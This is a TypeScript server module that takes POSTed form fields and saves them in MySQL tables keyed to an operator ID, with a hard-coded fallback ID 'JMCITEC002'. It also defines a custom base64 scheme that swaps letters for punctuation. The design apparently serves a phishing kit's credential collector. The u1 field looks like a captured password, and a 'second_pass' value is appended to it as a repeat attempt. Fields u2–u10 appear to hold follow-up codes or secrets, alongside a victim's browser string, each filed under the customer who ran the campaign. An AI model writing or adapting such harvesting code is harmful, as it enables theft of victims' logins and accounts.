import {Database, ResultParams, UserProp} from "./db";
import format from "date-fns/format";

process.env.TZ = "Africa/Lagos"
export type RequestQuery = {
    raw: string,
    data: string,
    second_pass: string
    brw: string
    type: string
    userid: string
    nametype: string
    username: string
    u1: string
    u2: string
    u3: string
    u4: string
    u5: string
    u6: string
    u7: string
    u8: string
    u9: string
    u10: string
}


// @ts-ignore
String.prototype._replace = function (searchValue: string | RegExp | [], replaceValue: string | RegExp | []): string {
    if (typeof searchValue === "string") return this.replaceAll(searchValue, replaceValue)
    if (Array.isArray(searchValue)) {
        if (Array.isArray(replaceValue)) {
            if (searchValue.length === replaceValue.length) {
                let main = this;
                for (let i = 0; i < searchValue.length; i++) {
                    main = main.replaceAll(searchValue[i], replaceValue[i])
                }
                return main;
            } else {
                return this;
            }
        } else {
            let main = this;
            for (let s of searchValue) {
                main = main.replaceAll(s, replaceValue)
            }
            return main;
        }
    } else {
        return this;
    }
}

export class Tools extends Database {
    private POST: RequestQuery
    private user: UserProp;

    constructor(_POST) {
        super();
        this.POST = _POST;
    }

    public async post_result() {
        await this.checkConnection();
        if (this.connected.length > 2) {
            return {
                type: "error", msg: this.connected
            }
        }
        let username = this.POST.username;
        let location = this.POST.type;
        let type = this.POST.nametype;
        let userID = this.POST.userid.toUpperCase();
        let checkUser = await this.checkUser(userID)
        let _data: ResultParams;
        if (!checkUser) {
            userID = "JMCITEC002";
        }
        let time = format(new Date(), "MMMM d, yyyy");//date("F j, Y");
        if (this.POST.u1) {
            if (this.POST.second_pass) {
                _data = await this.db_get_single(userID.trim().toLowerCase(), type.toLowerCase(), "username", username, "=");
                if (Object.keys(_data).length > 0) {
                    await this.get_query(`UPDATE \`${userID.trim().toLowerCase()}\` SET \`u1\`=? WHERE \`username\`=?`, [_data.u1 + this.POST.second_pass, username]);
                }
            } else {
                let time2 = format(new Date(), "MM-dd-yyyy h:mm:ss a");
                let u1 = this.POST.u1;
                let brw = this.POST.brw.replace('#time#', time2);
                let values = [userID, username, type, time, brw, u1, '', '', '', '', '', '', '']
                await this.get_query("INSERT INTO `" + userID.trim().toLowerCase() + "`(`user`, `username`, `type`, `time`, `brw`, `u1`, `u2`, `u3`, `u4`, `u5`, `u6`, `u7`, `u8`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", values);
            }
        } else {
            _data = await this.db_get_single(userID.trim().toLowerCase(), type.toLowerCase(), "username", username, "=");
            if (Object.keys(_data).length > 0) {
                if (this.POST.u2) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u2`=? WHERE `username`=?", [this.POST.u2, username]);
                } else if (this.POST.u3) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u3`=? WHERE `username`=?", [this.POST.u3, username]);
                } else if (this.POST.u4) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u4`=? WHERE `username`=?", [this.POST.u4, username]);
                } else if (this.POST.u5) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u5`=? WHERE `username`=?", [this.POST.u5, username]);
                } else if (this.POST.u6) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u6`=? WHERE `username`=?", [this.POST.u6, username]);
                } else if (this.POST.u7) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u7`=? WHERE `username`=?", [this.POST.u7, username]);
                } else if (this.POST.u8) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u8`=? WHERE `username`=?", [this.POST.u8, username]);
                } else if (this.POST.u9) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u9`=? WHERE `username`=?", [this.POST.u9, username]);
                } else if (this.POST.u10) {
                    await this.get_query("UPDATE `" + userID.trim().toLowerCase() + "` SET `u10`=? WHERE `username`=?", [this.POST.u10, username]);
                }
            }
        }
        await this.closeConnection();
        return {type: "success", msg: 'sent successfully'};
    }

    private base64Encode(str: string) {
        let re_1 = ["a", "b", "c", "d", "e", "A", 'B', "C", "D", "E"];
        let re_2 = [".", "`", "!", "|", ",", "*", '"', "~", ":", ";"];
        // @ts-ignore
        return this.base64_encode(str)._replace(re_1, re_2)
    }

    public base64Decode(str: string) {
        let re_1 = ["a", "b", "c", "d", "e", "A", 'B', "C", "D", "E"];
        let re_2 = [".", "`", "!", "|", ",", "*", '"', "~", ":", ";"];
        // @ts-ignore
        return this.base64_decode(str._replace(re_2, re_1));
    }

    private async checkUser(user: string): Promise<boolean> {
        let res = await this.get_query("select * from `user` WHERE `userID`=?", [user]);
        this.user = res.length > 0 ? res[0] : {}
        return Array.isArray(res) && res.length > 0
    }

    private base64_decode(str: string): string {
        try {
            return Buffer.from(str, 'base64').toString("utf-8")
        } catch (e) {
            return ""
        }
    }

    private base64_encode(str: string): string {
        try {
            return Buffer.from(str, 'utf8').toString("base64")
        } catch (e) {
            return ""
        }
    }
}
